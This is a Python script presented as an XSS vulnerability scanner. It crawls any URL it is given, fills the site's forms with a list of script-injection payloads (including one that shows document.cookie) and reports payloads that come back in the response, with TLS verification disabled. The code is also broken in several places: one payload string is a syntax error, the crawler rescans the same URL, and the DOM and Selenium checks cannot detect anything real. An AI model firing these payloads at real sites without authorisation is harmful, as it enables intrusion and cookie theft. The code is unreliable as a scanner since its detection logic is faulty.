import requests
import random
import argparse
import time
import logging
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup as bs
from urllib.robotparser import RobotFileParser
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# List of more advanced XSS payloads
XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    '\'><svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "javascript:/*--></title></style></textarea></script><script>alert(1)//",
    "<svg/onload=confirm('XSS')>",
    "<img src='x' onerror='confirm(1)'>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<div style='background-image: url(javascript:alert(1))'>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    ""><script>alert(1)</script>",  # New payload to trigger XSS on some pages
]

# Global set of crawled links
crawled_links = set()

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def print_crawled_links():
    """Print all crawled links"""
    print(f"\n[+] Links crawled:")
    for link in crawled_links:
        print(f"    {link}")
    print()

def get_all_forms(url):
    """Get all forms from a URL"""
    try:
        soup = bs(requests.get(url, verify=False).content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        logging.error(f"[-] Error retrieving forms from {url}: {e}")
        return []

def get_form_details(form):
    """Extract form details like action, method, inputs"""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    # Handle select and textarea elements
    for select_tag in form.find_all("select"):
        input_name = select_tag.attrs.get("name")
        options = [{"type": "select", "name": input_name, "options": [opt.text for opt in select_tag.find_all("option")]}]
        inputs.extend(options)

    for textarea_tag in form.find_all("textarea"):
        input_name = textarea_tag.attrs.get("name")
        inputs.append({"type": "textarea", "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    """Submit a form with XSS payload"""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] in ["text", "search", "textarea"]:
            input["value"] = payload
        if input.get("name"):
            data[input["name"]] = input.get("value", "")
    
    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data, verify=False)
        else:
            response = requests.get(target_url, params=data, verify=False)
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"[-] Error submitting form to {target_url}: {e}")
        return None

def test_for_dom_based_xss(url, payload):
    """Test URL fragment for DOM-based XSS"""
    test_url = f"{url}#{payload}"
    try:
        response = requests.get(test_url, verify=False)
        if payload in response.text:
            logging.info(f"{Fore.GREEN}[+] DOM-based XSS found in URL fragment: {test_url}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        logging.error(f"[-] Error testing DOM-based XSS: {e}")

def scan_xss(args, scanned_urls=None):
    """Main XSS scanning function"""
    global crawled_links
    if scanned_urls is None:
        scanned_urls = set()

    if args.url in scanned_urls:
        return False
    scanned_urls.add(args.url)

    forms = get_all_forms(args.url)
    logging.info(f"\n[+] Detected {len(forms)} forms on {args.url}")

    parsed_url = urlparse(args.url)
    domain = f"{parsed_url.scheme}://{parsed_url.netloc}"

    if args.obey_robots:
        robot_parser = RobotFileParser()
        robot_parser.set_url(urljoin(domain, "/robots.txt"))
        try:
            robot_parser.read()
        except Exception as e:
            logging.error(f"[-] Error reading robots.txt: {e}")
            crawl_allowed = False
        else:
            crawl_allowed = robot_parser.can_fetch("*", args.url)
    else:
        crawl_allowed = True

    if crawl_allowed:
        for form in forms:
            form_details = get_form_details(form)
            for payload in XSS_PAYLOADS:
                response = submit_form(form_details, args.url, payload)
                if response and payload in response.content.decode():
                    logging.info(f"\n{Fore.GREEN}[+] XSS Vulnerability Detected on {args.url}{Style.RESET_ALL}")
                    logging.info(f"[*] Form Details: {form_details}")
                    logging.info(f"{Fore.YELLOW}[*] Payload: {payload}{Style.RESET_ALL}")
                    if args.output:
                        with open(args.output, "a") as f:
                            f.write(f"URL: {args.url}\n")
                            f.write(f"Form Details: {form_details}\n")
                            f.write(f"Payload: {payload}\n")
                            f.write("-" * 50 + "\n\n")
                    break

    # Test for DOM-based XSS
    for payload in XSS_PAYLOADS:
        test_for_dom_based_xss(args.url, payload)

    # Crawl links if requested
    if args.crawl:
        logging.info(f"\n[+] Crawling links from {args.url}")
        links = get_all_links(args.url)
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(lambda link: crawl_and_scan(link, args, scanned_urls), links)

def crawl_and_scan(url, args, scanned_urls):
    """Helper function to crawl and scan new links"""
    if url not in scanned_urls:
        crawled_links.add(url)
        scan_xss(args, scanned_urls)

def get_all_links(url):
    """Get all links from a URL"""
    try:
        soup = bs(requests.get(url, verify=False).content, "html.parser")
        return [urljoin(url, link.get("href")) for link in soup.find_all("a")]
    except requests.exceptions.RequestException as e:
        logging.error(f"[-] Error retrieving links from {url}: {e}")
        return []

def test_js_payload_with_selenium(url, payload):
    """Test XSS using headless Selenium browser"""
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    driver.execute_script(f"document.body.innerHTML += '<div>{payload}</div>'")
    if payload in driver.page_source:
        logging.info(f"{Fore.GREEN}[+] XSS vulnerability found with Selenium on {url}{Style.RESET_ALL}")
    driver.quit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enhanced XSS Vulnerability scanner script.")
    parser.add_argument("url", help="URL to scan for XSS vulnerabilities")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl links from the given URL")
    parser.add_argument("-m", "--max-links", type=int, default=0, help="Maximum number of links to visit. Default 0, no limit.")
    parser.add_argument("--obey-robots", action="store_true", help="Obey robots.txt rules")
    parser.add_argument("-o", "--output", help="Output file to save the results")
    args = parser.parse_args()

    scan_xss(args)

    print_crawled_links()
